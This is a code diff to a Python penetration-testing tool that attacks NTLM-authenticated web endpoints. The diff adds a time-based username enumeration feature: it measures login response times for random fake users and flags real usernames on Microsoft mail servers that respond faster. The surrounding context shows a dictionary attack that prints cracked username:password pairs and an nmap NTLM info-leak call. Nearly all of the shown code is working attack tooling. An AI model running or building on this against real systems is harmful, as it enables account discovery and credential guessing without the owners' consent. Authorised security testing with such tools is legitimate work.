@@ -31,7 +31,7 @@ def test_login( username, password, url, http1_1 = False ):
     out = subprocess.check_output( cmd ).decode('utf8')
     if args.debug:
       print( out )
-    m = re.findall( "HTTP\/\d.\d (\d{3})", out )
+    m = re.findall( r"HTTP\/\d.\d (\d{3})", out )
     for code in m:
       if code != "401":
         print("[+] FOUND: " + username + " : " + password)
@@ -63,6 +63,8 @@ def cancel_handler(signal=None,frame=None):
 signal.signal(signal.SIGINT, cancel_handler)
 
 parser = argparse.ArgumentParser(description="Wrapper for NTLM info leak and NTLM dictionary attack")
+parser.add_argument("-i", "--info", action="store_true", help="Exploit NTLM info leak")
+parser.add_argument("-e", "--enumerate", action="store_true", help="Attempt time-based username enumeration on URL")
 parser.add_argument("-c", "--credslist", help="File with list of credentials in <username>:<password> format to use")
 parser.add_argument("-u", "--user", help="Username to dictionary attack as")
 parser.add_argument("-U", "--userlist", help="Username list to dictionary attack as")
@@ -70,7 +72,6 @@ parser.add_argument("-p", "--password", help="Password to dictionary attack as")
 parser.add_argument("-d", "--domain", help="NTLM domain name to attack")
 parser.add_argument("-P", "--passlist", help="Password list to dictionary attack as")
 parser.add_argument("-D", "--delay", help="Delay between each attempt, in seconds")
-parser.add_argument("-i", "--info", action="store_true", help="Exploit NTLM info leak")
 parser.add_argument("-s", "--same", action="store_true", help="Try password=username")
 parser.add_argument("-b", "--blank", action="store_true", help="Try blank password")
 parser.add_argument("-1", "--quitonsuccess", action="store_true", help="Stop as soon as the first credential is found")
@@ -109,6 +110,54 @@ if args.info:
   cmd = "nmap -p" + str(port) + " --script http-ntlm-info --script-args http-ntlm-info.root="+url.path+" "+url.netloc
   print(cmd)
   os.system( cmd )
+
+# Attempt time-based username enumeration. Valid users are quicker to respond on MS mail servers
+# Inspired by: https://github.com/busterb/msmailprobe
+if ( args.user or args.userlist ) and args.enumerate:
+  userlist = []
+  enumerated = []
+  if args.user: userlist.append(args.user)
+  if args.userlist:
+    with open( args.userlist, "r" ) as f:
+      for u in f.read().splitlines():
+        userlist.append(u)
+
+  # Generate fake usernames
+  import random, string
+  fakeusers = []
+  for i in range(10):
+    fakeusers.append(''.join(random.choices(string.ascii_lowercase + string.digits, k=10)))
+
+  # Determine an average response time for fake usernames
+  print('Working out an average response time for invalid usernames...' )
+  import time, statistics
+  responsetimes = []
+  for u in fakeusers:
+    start = round(time.time() * 1000)
+    test_login( u, 'ThisIsNotAnyonesRealPasswordIShouldHope', url.geturl(), args.http1_1 )
+    responsetimes.append(round(time.time() * 1000) - start)
+  avgresponse = statistics.mean( responsetimes )
+  print('\nAverage response time:',avgresponse,'ms')
+
+  # Run through each user, compare to average
+  for u in userlist:
+    start = round(time.time() * 1000)
+    test_login( u, 'ThisIsNotAnyonesRealPasswordIShouldHope', url.geturl(), args.http1_1 )
+    elapsed = round(time.time() * 1000) - start
+    print('Elapsed:', elapsed)
+
+    # If it's significantly less than average, it's valid. I guess we're hard-coding the significance!
+    if elapsed < (avgresponse * 0.77):
+      enumerated.append( u )
+      print("[+] " + u )
+    else:
+      print("[-] " + u )
+
+  print('Finished enumeration.')
+  if len( enumerated ) > 0:
+    print( 'Valid users:\n\n' + '\n'.join(enumerated))
+  else:
+    print( 'No valid users found :(' )
 
 if (( args.user or args.userlist ) and ( args.password or args.passlist )) or args.credslist:
   
